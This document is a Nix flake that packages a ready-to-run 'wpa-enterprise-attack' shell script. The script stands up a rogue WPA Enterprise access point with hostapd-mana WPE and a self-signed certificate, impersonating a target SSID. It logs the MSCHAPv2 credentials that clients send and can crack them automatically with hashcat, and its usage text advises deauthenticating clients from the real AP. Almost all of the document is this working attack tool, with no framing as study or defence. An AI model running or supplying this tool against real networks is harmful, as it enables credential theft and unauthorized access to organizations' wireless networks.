{
  description = "WPA Enterprise (802.1X/EAP) credential capture with hostapd-mana WPE";

  inputs = {
    nixpkgs.url = "github:NixOS/nixpkgs/nixos-unstable";
  };

  outputs = { self, nixpkgs }:
    let
      system = "x86_64-linux";
      pkgs = import nixpkgs { inherit system; };

      wpaEnterpriseAttack = pkgs.writeShellApplication {
        name = "wpa-enterprise-attack";
        runtimeInputs = with pkgs; [
          aircrack-ng
          asleap
          coreutils
          gnugrep
          hashcat
          hostapd-mana
          iproute2
          iw
          openssl
        ];

        text = ''
          set -euo pipefail

          usage() {
            printf '%s\n' "Usage: wpa-enterprise-attack <interface> <ssid> [output-dir]" >&2
            printf '%s\n' "" >&2
            printf '%s\n' "  interface  : wireless interface for the rogue AP" >&2
            printf '%s\n' "  ssid       : SSID to impersonate (must match the target network name)" >&2
            printf '%s\n' "  output-dir : directory for credentials and logs (default: current dir)" >&2
            printf '%s\n' "" >&2
            printf '%s\n' "Environment variables:" >&2
            printf '%s\n' "  EAP_CHANNEL=6    AP channel (default: 6)" >&2
            printf '%s\n' "  EAP_BAND=2.4     frequency band: 2.4 or 5 (default: 2.4)" >&2
            printf '%s\n' "  EAP_KARMA=0      respond to all probe requests, not just target SSID" >&2
            printf '%s\n' "  EAP_CRACK=0      auto-crack captured MSCHAPv2 with hashcat when WORDLIST set" >&2
            printf '%s\n' "  WORDLIST=<path>  wordlist for hashcat -m 5500 cracking" >&2
            printf '%s\n' "" >&2
            printf '%s\n' "Attack flow:" >&2
            printf '%s\n' "  1. Rogue AP with self-signed EAP/TLS server (hostapd-mana WPE mode)" >&2
            printf '%s\n' "  2. Target clients connect and initiate PEAP/TTLS EAP authentication" >&2
            printf '%s\n' "  3. MSCHAPv2 challenge/response pairs are written to output-dir" >&2
            printf '%s\n' "  4. Crack offline: hashcat -m 5500 hashes.txt wordlist.txt" >&2
            printf '%s\n' "     or asleap -C <challenge> -R <response> -W wordlist.txt" >&2
            printf '%s\n' "" >&2
            printf '%s\n' "Tip: deauth clients from the legitimate AP using the deauth/ flake" >&2
            printf '%s\n' "     to force them to reconnect to the rogue AP." >&2
            printf '%s\n' "" >&2
            printf '%s\n' "Example: wpa-enterprise-attack wlan1 CorpWiFi" >&2
            printf '%s\n' "Example: EAP_CHANNEL=11 EAP_CRACK=1 WORDLIST=/tmp/rockyou.txt \\" >&2
            printf '%s\n' "           wpa-enterprise-attack wlan1 CorpWiFi /tmp/eap" >&2
            exit 2
          }

          if [ "$#" -lt 2 ] || [ "$#" -gt 3 ]; then
            usage
          fi

          INTERFACE="$1"
          SSID="$2"
          OUTPUT_DIR="''${3:-.}"
          EAP_CHANNEL="''${EAP_CHANNEL:-6}"
          EAP_BAND="''${EAP_BAND:-2.4}"
          EAP_KARMA="''${EAP_KARMA:-0}"
          EAP_CRACK="''${EAP_CRACK:-0}"
          WORDLIST="''${WORDLIST:-}"

          if [ "$(id -u)" -ne 0 ]; then
            printf '%s\n' "This tool must be run as root." >&2
            exit 1
          fi

          if ! ip link show "$INTERFACE" >/dev/null 2>&1; then
            printf '%s\n' "Interface does not exist: $INTERFACE" >&2
            exit 1
          fi

          case "$EAP_CHANNEL" in
            ""|*[!0-9]*)
              printf '%s\n' "EAP_CHANNEL must be a positive integer." >&2
              exit 2
              ;;
          esac

          case "$EAP_BAND" in
            2.4) HW_MODE="g" ;;
            5)   HW_MODE="a" ;;
            *)
              printf '%s\n' "EAP_BAND must be 2.4 or 5." >&2
              exit 2
              ;;
          esac

          if [ -n "$WORDLIST" ] && [ ! -f "$WORDLIST" ]; then
            printf '%s\n' "Wordlist not found: $WORDLIST" >&2
            exit 1
          fi

          OUTPUT_DIR="$(readlink -f "$OUTPUT_DIR")"
          mkdir -p "$OUTPUT_DIR"

          WORK_DIR="$(mktemp -d)"
          TIMESTAMP="$(date +%Y%m%d-%H%M%S)"
          LOG_FILE="$OUTPUT_DIR/hostapd-$TIMESTAMP.log"
          CRED_FILE="$OUTPUT_DIR/eap-creds-$TIMESTAMP.txt"
          HASH_FILE="$OUTPUT_DIR/eap-hashes-$TIMESTAMP.txt"
          HOSTAPD_PID=""

          cleanup() {
            if [ -n "$HOSTAPD_PID" ]; then kill "$HOSTAPD_PID" 2>/dev/null || true; fi
            rm -rf "$WORK_DIR"
            printf '\n%s\n' "Credentials: $CRED_FILE"
            if [ -s "$HASH_FILE" ]; then
              printf '%s\n' "Hashes:      $HASH_FILE"
              printf '%s\n' "Crack with:  hashcat -m 5500 $HASH_FILE /path/to/wordlist.txt"
            fi
          }
          trap cleanup EXIT INT TERM

          # Self-signed CA and server certificate for the EAP/TLS tunnel
          printf '%s\n' "Generating EAP server certificate..."
          openssl genrsa -out "$WORK_DIR/ca.key" 2048 2>/dev/null
          openssl req -x509 -new -nodes -key "$WORK_DIR/ca.key" \
            -days 365 -out "$WORK_DIR/ca.pem" \
            -subj "/CN=Enterprise CA/O=Corp/C=US" 2>/dev/null
          openssl genrsa -out "$WORK_DIR/server.key" 2048 2>/dev/null
          openssl req -new -key "$WORK_DIR/server.key" \
            -out "$WORK_DIR/server.csr" \
            -subj "/CN=Enterprise Radius/O=Corp/C=US" 2>/dev/null
          openssl x509 -req -in "$WORK_DIR/server.csr" \
            -CA "$WORK_DIR/ca.pem" -CAkey "$WORK_DIR/ca.key" \
            -CAcreateserial -out "$WORK_DIR/server.pem" -days 365 2>/dev/null
          openssl dhparam -out "$WORK_DIR/dh" 2048 2>/dev/null

          # EAP user file: accept any identity via Phase 1 PEAP/TTLS, inner MSCHAPv2
          cat > "$WORK_DIR/eap_user" << 'EAPEOF'
# Phase 1: outer tunnel
*       PEAP,TTLS,TLS,FAST

# Phase 2: inner auth (runs inside the TLS tunnel)
"t"     MSCHAPV2,MD5,GTC,TTLS-MSCHAPV2,TTLS-MSCHAP,TTLS-PAP,TTLS-CHAP,PEAP [2]
EAPEOF

          # hostapd-mana WPE configuration
          KARMA_SETTING="0"
          if [ "$EAP_KARMA" = "1" ]; then
            KARMA_SETTING="1"
          fi

          cat > "$WORK_DIR/hostapd.conf" << HOSTAPDEOF
interface=$INTERFACE
driver=nl80211
ssid=$SSID
channel=$EAP_CHANNEL
hw_mode=$HW_MODE
auth_algs=3
wpa=2
wpa_key_mgmt=WPA-EAP
rsn_pairwise=CCMP TKIP

ieee8021x=1
eapol_version=2
eap_server=1
eap_user_file=$WORK_DIR/eap_user
ca_cert=$WORK_DIR/ca.pem
server_cert=$WORK_DIR/server.pem
private_key=$WORK_DIR/server.key
dh_file=$WORK_DIR/dh

# MANA WPE: intercept and log EAP credentials
mana_wpe=1
mana_eapsuccess=1
mana_loud=$KARMA_SETTING
HOSTAPDEOF

          printf '%s\n' "WPA Enterprise credential capture"
          printf '%s\n' "  Interface : $INTERFACE"
          printf '%s\n' "  SSID      : $SSID"
          printf '%s\n' "  Channel   : $EAP_CHANNEL (''${EAP_BAND} GHz)"
          if [ "$EAP_KARMA" = "1" ]; then
            printf '%s\n' "  Mode      : KARMA (responds to all probe requests)"
          fi
          printf '%s\n' "  Creds     : $CRED_FILE"
          printf '%s\n' ""
          printf '%s\n' "Use the deauth/ flake to kick clients off the real AP."
          printf '%s\n' "Press Ctrl+C to stop."
          printf '%s\n' ""

          touch "$LOG_FILE"
          hostapd "$WORK_DIR/hostapd.conf" >> "$LOG_FILE" 2>&1 &
          HOSTAPD_PID=$!
          sleep 2

          if ! kill -0 "$HOSTAPD_PID" 2>/dev/null; then
            printf '%s\n' "hostapd-mana failed to start." >&2
            printf '%s\n' "Log: $LOG_FILE" >&2
            exit 1
          fi

          # Parse hostapd-mana log for WPE credential blocks and print them live.
          # mana_credout triggers a buffer overflow in hostapd-mana 2.6.5 so we
          # extract credentials from stdout instead — it logs the same blocks there.
          LAST_LOG_SIZE=0
          while true; do
            if ! kill -0 "$HOSTAPD_PID" 2>/dev/null; then
              printf '\n%s\n' "hostapd-mana exited unexpectedly." >&2
              break
            fi

            CURR_LOG_SIZE="$(wc -c < "$LOG_FILE" | tr -d ' ' || echo 0)"
            if [ "$CURR_LOG_SIZE" -gt "$LAST_LOG_SIZE" ]; then
              NEW="$(tail -c +"$((LAST_LOG_SIZE + 1))" "$LOG_FILE")"
              LAST_LOG_SIZE="$CURR_LOG_SIZE"

              CREDS="$(printf '%s\n' "$NEW" \
                | grep -E '^(MANA WPE|Domain.\\|Challenge: |Response: |Jtr NETNTLM: |Hashcat NETNTLM: )' \
                || true)"
              if [ -n "$CREDS" ]; then
                printf '%s\n' "$CREDS"
                printf '%s\n' "$CREDS" >> "$CRED_FILE"

                printf '%s\n' "$CREDS" \
                  | grep '^Hashcat NETNTLM: ' \
                  | sed 's/^Hashcat NETNTLM: //' >> "$HASH_FILE" || true

                if [ "$EAP_CRACK" = "1" ] && [ -s "$HASH_FILE" ] && [ -n "$WORDLIST" ]; then
                  printf '\n%s\n' "Cracking MSCHAPv2 with hashcat (mode 5500)..."
                  hashcat -m 5500 "$HASH_FILE" "$WORDLIST" || true
                fi
              fi
            fi
            sleep 3
          done
        '';
      };

    in
    {
      packages.${system} = {
        wpa-enterprise-attack = wpaEnterpriseAttack;
        default = wpaEnterpriseAttack;
      };

      apps.${system} = {
        default = {
          type = "app";
          program = "${wpaEnterpriseAttack}/bin/wpa-enterprise-attack";
        };
      };

      devShells.${system}.default = pkgs.mkShell {
        packages = with pkgs; [
          aircrack-ng
          asleap
          hashcat
          hostapd-mana
          iproute2
          iw
          openssl
        ];
      };
    };
}
